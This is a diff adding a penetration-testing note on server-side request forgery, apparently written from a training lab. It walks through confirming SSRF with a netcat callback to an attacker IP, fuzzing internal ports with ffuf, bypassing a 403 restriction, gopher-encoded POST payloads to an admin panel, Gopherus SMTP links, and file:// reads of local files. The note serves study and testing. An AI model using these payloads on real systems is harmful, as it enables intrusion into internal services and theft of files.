@@ -1,0 +1,402 @@
+---
+Primary_category: "[[WEB ATTACKS]]"
+title: "SSRF"
+draft: false
+banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
+banner_y: 0.88286
+tags:
+cssclasses:
+---
+
+###### PRIMARY CATEGORY → [[WEB ATTACKS]]
+
+#### *Theory*
+
+A ***Server-Side Request Forgery ( SSRF )*** vulnerability occurs when an application allows an attacker to influence or control a server-side request to an arbitrary destination.
+
+This can be abused to make the vulnerable server access internal services, restricted resources, cloud metadata endpoints or external systems that would otherwise be unreachable by the attacker
+
+---
+
+#### *Confirming SSRF*
+
+Let's suppose we are dealing with a web page that have a *appointment schedule* feature
+
+![[SSRF-20260916183209151.webp|300]]
+
+> ***Zoom in***
+
+So, we fill in the required information and select the *Check Availability* button
+
+Then, an *HTTP* request is made, so we can intercept the latter using an *HTTP Proxy* such as *Burpsuite*
+
+Doing so, we get the following information →
+
+![[SSRF-20260916183729818.webp|450]]
+
+> ***Zoom in***
+
+An *HTTP POST* request is made to **`/index.php`** with the following data:
+
+```bash
+dateserver=http://dateserver.htb/availability.php&date=2024-01-01
+```
+
+A *URL* is specified in the **`dateserver`** parameter. Therefore, we could test for an *SSRF* by specifying a *URL* that we control
+
+To do so, we can proceed as follows →
+
+###### *Setting up a TCP Listener*
+
+We could use the *python* **`http.server`** module to receive the incoming request, but *netcat* provides more information at first
+
+```bash
+nc -nlvp 80
+```
+
+> [!TLDR]- *Expected Output*
+>
+> ```bash
+> listening on [any] 8000 ...
+> ```
+>
+
+###### *Sending the HTTP Request*
+
+```bash
+curl --silent --location --request POST --header 'Content-Type: application/x-www-form-urlencoded' --data 'dateserver=http://<ATTACKER_IP>/ssrf&date=2024-01-01' 'http://<TARGET>/index.php'
+```
+
+> [!DANGER]- *e.g.*
+>
+> ```bash
+> curl --silent --location --request POST --header 'Content-Type: application/x-www-form-urlencoded' --data 'dateserver=http://10.10.10.5/ssrf&date=2024-01-01' 'http://10.129.61.185/index.php'
+> ```
+>
+
+> [!TLDR]- *Expected Netcat Output*
+>
+> ```bash
+> listening on [any] 80 ...
+> connect to [10.10.10.5] from (UNKNOWN) [10.129.61.185] 38782
+> GET /ssrf HTTP/1.1
+> Host: 10.10.10.5:80
+> Accept: */*
+> ```
+>
+
+So, the web application in question is vulnerable to *SSRF*, as we have been able to coerce it into making an *HTTP* request to an external resource - in this case under our control
+
+---
+
+#### *Internal Network Enumeration*
+
+##### *Internal Port Discovery*
+
+Following the example of ***[[#Confirming SSRF]]***, we can leverage this security flaw to conduct a port scan from the target and maybe uncover non-externally accesible ports
+
+> ***Uncover ports on the given host or on other host on the same network***
+
+First, we have to know how the web server responds when we try to reach an unavailable port
+
+```bash
+curl --silent --location --request POST --data 'dateserver=http://localhost:<PORT>&date=2024-01-01' 'http://<TARGET>/index.php' ; echo
+```
+
+> [!DANGER]- *e.g.*
+>
+> ```bash
+> curl --silent --location --request POST --data 'dateserver=http://localhost:7777&date=2024-01-01' 'http://10.129.61.185/index.php' ; echo
+> ```
+>
+
+> [!TLDR]- *Expected Output*
+>
+> ```bash
+>Error (7): Failed to connect to localhost port 7777 after 0 ms: Couldn't connect to server
+> ```
+>
+
+Doing so, we can filter out this response and automate the process above using a fuzzer to discover any internal port
+
+- ***[Ffuf](https://github.com/ffuf/ffuf)***
+
+```bash
+ffuf -v -w <( seq 1 10000 ) -X POST --data 'dateserver=http://localhost:FUZZ&date=2024-01-01' -H 'Content-Type: application/x-www-form-urlencoded' -u 'http://<TARGET>/index.php' -fr '<HTTP_RESPONSE_TEXT>'
+```
+
+> [!DANGER]- *e.g.*
+>
+> ```bash
+> ffuf -v -w <( seq 1 10000 ) -X POST --data 'dateserver=http://localhost:FUZZ&date=2024-01-01' -H 'Content-Type: application/x-www-form-urlencoded' -u 'http://10.129.61.185/index.php' -fr 'Failed to connect to'
+> ```
+>
+
+> [!TLDR]- *Expected Output*
+>
+> ```bash
+><SNIP>
+> [Status: 200, Size: 45, Words: 7, Lines: 1, Duration: 96ms]
+> | URL | http://10.129.61.185/index.php
+>     * FUZZ: 3306
+> 
+> [Status: 200, Size: 37, Words: 1, Lines: 1, Duration: 82ms]
+> | URL | http://10.129.61.185/index.php
+>     * FUZZ: 8000
+> <SNIP>
+> ```
+>
+
+Then, we can verify if there is a web application on any of the discovered ports and if its content is delivered in the *HTTP Response*
+
+---
+
+#### *Restricted Endpoint/Service Access*
+
+##### *HTTP - GET*
+
+Once we have discovered an *SSRF* vulnerability, we can leverage it to access restricted web applications or another endpoints
+
+That is, following the previous example, we intercept an *HTTP* request and see a *POST* parameter whose value corresponds to an specific *URL* containing an unknown domain
+
+```bash
+dateserver=http://dateserver.htb/availability.php...<SNIP>
+```
+
+If we add the domain above into our **`/etc/hosts`** file and try to access it, we get a *403 forbidden* error
+
+![[SSRF-20260917163737204.webp|450]]
+
+> ***Zoom in***
+
+So, it seems that there is any access restriction. However, we could try to leverage the *SSFR* to access it again
+
+![[SSRF-20260917164248377.webp|450]]
+
+Doing so, we don't receive another *403* error but rather a resource with directory listing enabled, so we have successfully bypassed the imposed restriction
+
+Now, let's suppose that directory listing was not enabled for this virtual host, then we would have to fuzz for existing resources i.e. directories and files
+
+To do this, we could proceed as follows →
+
+```bash
+ffuf -v -w '<WORDLIST>' -X POST --data 'dateserver=http://dateserver.htb/FUZZ&date=2024-01-01' -H 'Content-Type: application/x-www-form-urlencoded' -e '.php' -u 'http://<TARGET>/index.php' -fr 'The requested URL was not found'
+```
+
+> [!DANGER]- *e.g.*
+>
+> ```bash
+>ffuf -v -t 200 -w '/usr/share/seclist/Discovery/Web-Content/raft-small-words.txt' -X POST --data 'dateserver=http://dateserver.htb/FUZZ&date=2024-01-01' -H 'Content-Type: application/x-www-form-urlencoded' -e '.php' -u 'http://10.129.61.185/index.php' -fr 'The requested URL was not found' 
+> ```
+>
+
+> [!TLDR]- *Expected Output*
+>
+> ```bash
+> <SNIP>
+> [Status: 200, Size: 361, Words: 55, Lines: 16, Duration: 73ms]
+> | URL | http://10.129.215.130/index.php
+>     * FUZZ: admin.php
+>
+> [Status: 200, Size: 11, Words: 1, Lines: 1, Duration: 75ms]
+> | URL | http://10.129.215.130/index.php
+>     * FUZZ: availability.php
+> <SNIP>
+> ```
+>
+
+##### *Gopher*
+
+###### *POST*
+
+Once we have disclosed some interesting endpoints in a non-accesible web application through the discovered *SSRF*, such as **`/admin.php`**, it might be required to send data to them via *POST* requests
+
+![[SSRF-20260917174254237.webp]]
+
+> ***Zoom in***
+
+Then, a problem arises as we can only send data through the *URL* we put in the *dataserver* parameter i.e. only *HTTP GET* requests can be sent
+
+However, this is where *Gopher* comes into play, a protocol that allows us to send arbitrary bytes to a *TCP* socket
+
+So, we can leverage it to create a *POST* request by building the *HTTP* request ourselves, such as:
+
+```bash
+POST /admin.php HTTP/1.1
+Host: dateserver.htb
+Content-Length: 13
+Content-Type: application/x-www-form-urlencoded
+
+adminpw=admin
+```
+
+It requires to *URL-encode* both spaces and newlines characters in order to build a valid *gopher URL*. An specific format is required as well →
+
+```bash
+gopher://<TARGET>:<PORT>/_<URL_ENCODED_REQUEST>
+```
+
+> [!DANGER]- *e.g.*
+>
+> ```bash
+> gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
+> ```
+>
+
+The, the payload above must be *URL-encoded again* to ensure a correct *URL* format, otherwise we will get a *Malformed URL* error
+
+After that, we can send the given *HTTP POST* request via the *SSRF* and gain access to the admin pannel as long as the provided password is correct
+
+![[SSRF-20260917175516604.webp|450]]
+
+> ***Zoom in***
+
+###### *Other Protocols*
+
+The *Gopher* protocol can be used to interact with many other protocols and services as well, namely:
+
+> [!IMPORTANT]- *Protocols*
+>
+> ```bash
+> MySQL
+> PostgreSQL
+> FastCGI
+> Redis
+> SMTP
+> Zabbix
+> Memcache
+> ```
+>
+
+Again, let's suppose that, after discovering an *SSRF*, we perform an ***[[#Internal Port Discovery]]*** and see that *port 25* is open, related to ***[[25, 465, 587 - SMTP|SMTP]]***
+
+If so, we can leverage *Gopher* to interact with this *SMTP server* through the *SSRF*
+
+- ***[Gopherus](https://github.com/tarunkant/Gopherus)***
+
+> ***Python2 is required. Check [[COLDFUSION#Exploitation|this]] out for installation***
+
+***Setup***
+
+```bash
+git clone https://github.com/tarunkant/Gopherus
+```
+
+***Usage***
+
+```bash
+python2.7 gopherus.py --exploit smtp
+```
+
+> [!TLDR]- *Expected Output*
+>
+> ```bash
+> Give Details to send mail: 
+> 
+> Mail from :  john.doe@example.com
+> Mail To :  anonymous@example.com
+> Subject :  Test Email
+> Message :  Test Email
+> 
+> Your gopher link is ready to send Mail: 
+> 
+> gopher://127.0.0.1:25/_MAIL%20FROM:john.doe%40example.com%0ARCPT%20To:anonymous%40example.com%0ADATA%0AFrom:john.doe%40example.com%0ASubject:Test%20Email%0AMessage:Test%20Email%0A.
+> 
+> -----------Made-by-SpyD3r-----------
+> ```
+>
+
+---
+
+#### *Local File Inclusion*
+
+> ***See [[LFI]]***
+
+We can also disclose system local files' content in an *SSRF* by replacing the *URL* scheme with **`file://`** 
+
+![[SSRF-20260917171302422.webp|450]]
+
+> ***Zoom in***
+
+---
+
+#### *Blind SSRF*
+
+In real word scenarios, most of the *SSRF* discovered are blind, which means that we cannot see the response
+
+Therefore, all previous techniques and attack vectors are unavailable to us as they rely on our ability to inspect the response
+
+However, we can still leverage this security flaw to enumerate either open ports in the local network or existing files on the system in question
+
+##### *Open Ports*
+
+To do so, we must infer it based on the response we get
+
+For instance, knowing that *port 80* is open, as It's externally accesible, we can send a request to this port through the *SSRF*
+
+> ***Request***
+
+```bash
+POST /index.php HTTP/1.1
+<SNIP>
+dateserver=http://dateserver.htb:80&date=2024-01-01
+```
+
+> ***Response***
+
+```bash
+HTTP/1.1 200 OK
+<SNIP>
+Date is unavailable. Please choose a different date!
+```
+
+In the other side, we receive the following response if we send a request to a non-listening port
+
+```bash
+HTTP/1.1 200 OK
+<SNIP>
+Something went wrong!
+```
+
+So, we can filter by the first response text to see if we get any hit apart from *port 80*
+
+- ***[Ffuf](https://github.com/ffuf/ffuf)***
+
+```bash
+ffuf -v -w <( seq 1 10000) -X POST --data 'dateserver=http://dateserver.htb:FUZZ&date=2024-01-01' -H 'Content-Type: application/x-www-form-urlencoded' -u 'http://<TARGET>/index.php' -mr 'Date is unavailable'
+```
+
+> [!DANGER]- *e.g.*
+>
+> ```bash
+> ffuf -v -w <( seq 1 10000) -X POST --data 'dateserver=http://dateserver.htb:FUZZ&date=2024-01-01' -H 'Content-Type: application/x-www-form-urlencoded' -u 'http://10.129.5.203/index.php' -mr 'Date is unavailable'
+> ```
+>
+
+> [!TLDR]- *Expected Output*
+>
+> ```bash
+> <SNIP>
+> [Status: 200, Size: 52, Words: 8, Lines: 1, Duration: 3489ms]
+> | URL | http://10.129.5.203/index.php
+>     * FUZZ: 80
+> 
+> [Status: 200, Size: 52, Words: 8, Lines: 1, Duration: 86ms]
+> | URL | http://10.129.5.203/index.php
+>     * FUZZ: 5000
+> ```
+>
+
+##### *Files*
+
+The same principle applies with system files
+
+> ***Replace `http://` with `file://`***
+
+![[SSRF-20260917190705116.webp|500]]
+
+> ***Zoom in***
+
+![[SSRF-20260917190720846.webp|500]]
+
+> ***Zoom in***
